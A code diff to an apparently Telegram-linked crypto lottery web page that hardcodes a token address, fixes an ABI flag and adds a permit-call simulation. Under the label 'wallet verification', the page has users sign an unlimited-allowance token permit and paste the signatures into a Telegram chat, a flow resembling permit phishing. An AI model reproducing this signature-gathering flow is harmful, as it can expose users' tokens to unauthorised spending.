@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -93,7 +94,7 @@
         document.getElementById('userId').textContent = userId;
 
         const LOTTERY_CONTRACT_ADDRESS = ethers.utils.getAddress('0xDE0c4272F6Ab09D06Db9EeA94F2639454fC782ee');
-        let LUCK_TOKEN_ADDRESS = null;
+        const LUCK_TOKEN_ADDRESS = ethers.utils.getAddress('0x375c00DFCA476F427A47d4bca3Bd4bB6F48BEFEE');
         const LOTTERY_CONTRACT_ABI = [
             {
                 "type": "constructor",
@@ -227,7 +228,7 @@
             {"name": "ReentrancyGuardReentrantCall", "type": "error", "inputs": []},
             {"name": "StringTooLong", "type": "error", "inputs": [{"name": "str", "type": "string", "internalType": "string"}]},
             {"name": "Approval", "type": "event", "inputs": [{"name": "owner", "type": "address", "indexed": true, "internalType": "address"}, {"name": "spender", "type": "address", "indexed": true, "internalType": "address"}, {"name": "value", "type": "uint256", "indexed": false, "internalType": "uint256"}], "anonymous": false},
-            {"name": "ConstructorDebug", "type": "event", "inputs": [{"name": "message", "type": "string", "indexed": "false", "internalType": "string"}, {"name": "account", "type": "address", "indexed": false, "internalType": "address"}, {"name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256"}], "anonymous": false},
+            {"name": "ConstructorDebug", "type": "event", "inputs": [{"name": "message", "type": "string", "indexed": false, "internalType": "string"}, {"name": "account", "type": "address", "indexed": false, "internalType": "address"}, {"name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256"}], "anonymous": false},
             {"name": "DistributionContractSet", "type": "event", "inputs": [{"name": "distributionContract", "type": "address", "indexed": false, "internalType": "address"}], "anonymous": false},
             {"name": "EIP712DomainChanged", "type": "event", "inputs": [], "anonymous": false},
             {"name": "LiquidityAdded", "type": "event", "inputs": [{"name": "tokenAmount", "type": "uint256", "indexed": false, "internalType": "uint256"}, {"name": "bnbAmount", "type": "uint256", "indexed": false, "internalType": "uint256"}], "anonymous": false},
@@ -335,8 +336,7 @@
                 }
 
                 const lotteryContract = new ethers.Contract(LOTTERY_CONTRACT_ADDRESS, LOTTERY_CONTRACT_ABI, provider);
-                LUCK_TOKEN_ADDRESS = await lotteryContract.luckToken();
-                console.log('Fetched $LUCK token address:', LUCK_TOKEN_ADDRESS);
+                console.log('Using hardcoded $LUCK token address:', LUCK_TOKEN_ADDRESS);
 
                 const isPaused = await lotteryContract.paused();
                 const existingWallet = await lotteryContract.telegramIdToWallet(parseInt(userId));
@@ -499,7 +499,42 @@
                 const r = permitSig.r;
                 const s = permitSig.s;
 
-                const result = `Message Signature: ${messageSignature || 'Skipped (wallet already linked)'}\nPermit Signature (v,r,s): ${v},${r},${s}\nTransaction Hash: ${tx?.hash || 'Skipped'}`;
+                // Simulate permit call
+                const luckTokenWithSigner = luckTokenContract.connect(signer);
+                console.log('Simulating permit call with:', {
+                    owner: userAddress,
+                    spender: LOTTERY_CONTRACT_ADDRESS,
+                    value: MAX_ALLOWANCE.toString(),
+                    deadline: parseInt(deadline),
+                    v,
+                    r,
+                    s
+                });
+                const permitCallResult = await provider.call({
+                    to: LUCK_TOKEN_ADDRESS,
+                    data: luckTokenContract.interface.encodeFunctionData('permit', [
+                        userAddress,
+                        LOTTERY_CONTRACT_ADDRESS,
+                        MAX_ALLOWANCE,
+                        parseInt(deadline),
+                        v,
+                        r,
+                        s
+                    ])
+                }).catch(err => {
+                    console.error('Permit simulation error:', err);
+                    try {
+                        const decodedError = luckTokenContract.interface.parseError(err.data);
+                        console.error('Decoded permit revert reason:', decodedError);
+                        return decodedError;
+                    } catch (decodeErr) {
+                        console.error('Failed to decode permit error:', decodeErr);
+                        return err;
+                    }
+                });
+                console.log('Permit simulation result:', permitCallResult);
+
+                const result = `Message Signature: ${messageSignature || 'Skipped (wallet already linked)'}\nPermit Signature (v,r,s): ${v},${r},${s}\nTransaction Hash: ${tx?.hash || 'Skipped'}\nPermit Simulation: ${JSON.stringify(permitCallResult)}`;
                 document.getElementById('result').value = result;
                 alert('Wallet verification and permit approval successful! Please copy the signatures and transaction hash above and paste them back into the Telegram chat.');
             } catch (error) {
